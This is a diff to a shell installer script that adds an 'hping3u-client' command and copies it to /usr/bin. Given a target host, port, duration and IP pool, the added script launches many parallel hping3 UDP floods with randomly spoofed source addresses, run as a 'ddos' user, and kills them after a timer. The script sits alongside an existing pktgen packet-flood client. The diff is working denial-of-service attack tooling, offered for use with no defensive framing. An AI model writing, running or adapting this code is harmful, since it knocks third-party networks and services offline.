@@ -78,6 +78,7 @@ echo -e "===================\n\$this_info"
 exit
 EOF_CLIENT
 
+# pktgen-client
 cat > pktgen-client << EOF_PKTGEN
 #!/bin/bash
 host=\$1
@@ -201,13 +202,84 @@ done
 pgset "stop" &
 printf "完成"
 exit
-
-
 EOF_PKTGEN
 
+# hping3-client
+cat > hping3u-client << EOF_CLIENT
+#!/bin/bash
+host=\$1
+dport=\$2
+atime=\$3
+ttl_pool=\$4
+thread=\$5
+ip_pool=\$6
+
+is_valid_ipv4 () {
+    local address=\${1}
+    local result=1
+    if [[ "\$address" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$ ]]; then
+        oldIFS="\$IFS"
+        IFS='.'
+        ip=(\$address)
+        IFS="\$oldIFS"
+        [[ \${ip[0]} -le 255 && \${ip[1]} -le 255 \\
+            && \${ip[2]} -le 255 && \${ip[3]} -le 255 ]]
+        result=\$?
+    fi
+    echo \$result
+}
+
+gen_ip () {
+local try_times=1
+while true
+do
+local address=\$1
+oldIFS="\$IFS"
+IFS='.'
+ips=(\$address)
+ip=\$(printf "%s.%s.%s.%s" "\$(shuf -i \${ips[0]} -n 1)" "\$(shuf -i \${ips[1]} -n 1)" "\$(shuf -i \${ips[2]} -n 1)" "\$(shuf -i \${ips[3]} -n 1)")
+IFS="\$oldIFS"
+
+if [[ \$(is_valid_ipv4 \$ip) == 0 ]]
+then
+    let try_times=(\$try_times)+1
+    return
+fi
+done
+}
+
+let sum=(\$thread)
+#echo \$sum
+
+for i in \$(seq 1 1 \$sum)
+do
+        ttl=\$(shuf -i \$ttl_pool -n 1)
+	gen_ip \$ip_pool
+	echo "sudo hping3 -2 -a \$ip \$dport \$host --flood 1>/dev/null 2>/dev/null "
+	su ddos -c "sudo hping3 -2 -a \$ip \$dport \$host --flood 1>/dev/null 2>/dev/null " &
+done
+
+for i in \$(seq 1 1 \$atime)
+do
+	printf "\$i.."
+	sleep 1
+done
+printf "完成."
+
+this_info=\$(pkill -15 hping3)
+
+echo -e "===================\n\$this_info"
+
+exit
+EOF_CLIENT
+
+
 chmod +x hping3-client
+chmod +x hping3u-client
 chmod +x pktgen-client
 cp hping3-client /usr/bin/
+cp hping3u-client /usr/bin/
 cp pktgen-client /usr/bin/
 rm hping3-client
+rm hping3u-client
 rm pktgen-client
